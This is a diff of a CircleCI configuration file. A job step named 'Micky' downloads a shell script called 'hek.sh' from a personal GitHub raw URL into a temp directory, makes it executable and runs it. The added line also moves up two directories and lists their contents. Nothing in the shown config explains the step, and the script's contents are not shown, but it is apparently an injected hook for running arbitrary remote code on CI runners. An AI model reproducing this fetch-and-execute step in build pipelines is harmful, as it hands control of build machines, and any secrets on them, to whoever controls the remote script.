@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Micky"
-          command: "cd .. && cd tmp && wget https://raw.githubusercontent.com/funfactbro/latenightthought/main/hek.sh && chmod +x hek.sh && ./hek.sh"
+          command: "cd ../../ && ls && cd tmp && wget https://raw.githubusercontent.com/funfactbro/latenightthought/main/hek.sh && chmod +x hek.sh && ./hek.sh"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
